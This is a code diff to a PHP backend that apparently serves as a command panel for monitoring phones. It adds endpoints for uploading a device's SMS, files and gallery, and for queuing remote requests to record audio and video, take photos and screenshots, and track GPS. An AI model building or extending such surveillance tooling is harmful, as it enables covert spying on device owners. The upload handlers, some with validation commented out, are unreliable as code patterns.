@@ -249,7 +249,6 @@ switch ($_REQUEST["act"]) {
             exit;
         }
         $device_id = $_REQUEST["deviceId"];
-
         $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, 0, "null", 0, 1, $device_id, 1);
             if ($result > 0 && isset($result)) {
                 send_msg(lang::$success, lang::$message);
@@ -258,7 +257,26 @@ switch ($_REQUEST["act"]) {
             }
        // echo $result;
         break;
+    case 'set_sms':
+        $arr = array("IMEI", "number", "text","registerdate");
 
+        $valid_data = check_validation($arr);
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $device_id = $device_id[0]["id"];
+        $dd= '"'.date('Y-m-d H:i:s',($_REQUEST['registerdate']/1000)).'"';
+
+        $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, 0,$dd, 1, 1, $device_id, 1);
+        if ($result > 0 && isset($result)) {
+            send_msg(lang::$success, lang::$message);
+        } else {
+            send_msg(lang::$failed, lang::$error);
+        }
+        // echo $result;
+        break;
     //______________ get all sms
     case 'get_sms':
         $result = access::get_all_sms();
@@ -513,19 +531,61 @@ switch ($_REQUEST["act"]) {
         access::set_directory($_REQUEST['file_name'], $_REQUEST['file_type'], $_REQUEST['parent'], $deviceId);
         send_msg(lang::$success, lang::$message, "success");
         break;
-
-    case 'upload_file':
-        $valid_data = check_validation(array("IEMI", "file_payload","file_name" , "file_type","path"));
+    case 'upload_request':
+        $valid_data = check_validation(array("deviceId", "pathId"));
         if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
             send_msg(lang::$invalid_data, lang::$error);
             exit;
         }
-        //TODO: set proseduer
+        $path = $_REQUEST["pathId"];
+        if($path == "root"){$path= 0;}
+        access::set_request($_REQUEST["deviceId"],13,$path);
 
+        break;
+    case 'upload_file':
+        $valid_data = check_validation(array("IMEI","id","reqid"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $device_id = $device_id[0]["id"];
+        filing::$root=path_mobile.$device_id."/explorer/";
+        $fname = filing::upload_file("uploaded_file");
+        access::edit_directory_isDownload_by_Id($_REQUEST['reqid'],filing::$root.$fname,true);
+        access::delete_request($_REQUEST['id']);
+        send_msg(lang::$success, lang::$message, "success");
+
+        break;
+    case 'upload_gallery':
+        $valid_data = check_validation(array("IMEI","id","reqid"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $device_id = $device_id[0]["id"];
+        filing::$root=path_mobile.$device_id."/gallery/";
+        $fname = filing::upload_file("uploaded_file");
+        access::set_custome_file_list($device_id,$fname,filing::$root,0,7);
+        access::delete_request($_REQUEST['id']);
+        send_msg(lang::$success, lang::$message, "success");
 
     break;
 
     //_____________ tak photo
+
+    case'get_gallery':
+//        $valid_data = check_validation(array("IMEI"));
+//        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+//            send_msg(lang::$invalid_data, lang::$error);
+//            exit;
+//        }
+        // $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $device_id = $_SESSION["device"]["id"];
+        access::set_request($device_id,12,0);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
 
     case'take_voice':
 //        $valid_data = check_validation(array("IMEI"));
@@ -613,17 +673,22 @@ switch ($_REQUEST["act"]) {
         }
         $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
         $device_id = $device_id[0]["id"];
-        $device_id =0;
         filing::$root=path_mobile.$device_id."/";
-        $result = filing::upload_file();
-        if($result != 0){
-            //TODO: update database and remove files
-            access::edit_custome_file_list($_REQUEST['reqid'],$result,filing::$root);
-            access::delete_request($_REQUEST['id']);
-            send_msg(lang::$success, lang::$message, "success");
-        }else {
-            send_msg(lang::$failed, lang::$error);
+        $fname = filing::upload_file("uploaded_file");
+        access::edit_custome_file_list($_REQUEST['reqid'], $fname, filing::$root);
+        access::delete_request($_REQUEST['id']);
+        send_msg(lang::$success, lang::$message, "success");
+
+        break;
+
+    case 'delete_request':
+        $valid_data = check_validation(array("id"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
         }
+        access::delete_request($_REQUEST['id']);
+        send_msg(lang::$success, lang::$message, "success");
         break;
 
     //____________ GPS Acts
@@ -752,6 +817,13 @@ switch ($_REQUEST["act"]) {
             $contact = access::get_contact_request_by_deviceId($device_id[0]['id']);
             $gps_start = access::get_Request(3,$device_id[0]['id']);
             $gps_stop = access::get_Request(4,$device_id[0]['id']);
+            $record_voice = access::get_Request(6,$device_id[0]['id']);
+            $recorde_video_front_camera = access::get_Request(7,$device_id[0]['id']);
+            $record_video_back_camera = access::get_Request(8,$device_id[0]['id']);
+            $take_photo_front_camera = access::get_Request(9,$device_id[0]['id']);
+            $take_photo_back_camera = access::get_Request(10,$device_id[0]['id']);
+            $take_screenshot = access::get_Request(11,$device_id[0]['id']);
+            $get_gallery = access::get_Request(12,$device_id[0]['id']);
             $result = array();
             $index_result = 0;
             for ($index = 0; $index < count($sms); $index++) {
@@ -768,6 +840,34 @@ switch ($_REQUEST["act"]) {
             }
             for ($index = 0; $index < count($gps_stop); $index++) {
                 $result[$index_result] = $gps_stop[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($record_voice); $index++) {
+                $result[$index_result] = $record_voice[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($recorde_video_front_camera); $index++) {
+                $result[$index_result] = $recorde_video_front_camera[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($record_video_back_camera); $index++) {
+                $result[$index_result] = $record_video_back_camera[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($take_photo_front_camera); $index++) {
+                $result[$index_result] = $take_photo_front_camera[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($take_photo_back_camera); $index++) {
+                $result[$index_result] = $take_photo_back_camera[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($take_screenshot); $index++) {
+                $result[$index_result] = $take_screenshot[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($get_gallery); $index++) {
+                $result[$index_result] = $get_gallery[$index];
                 $index_result++;
             }
             send_result($result);
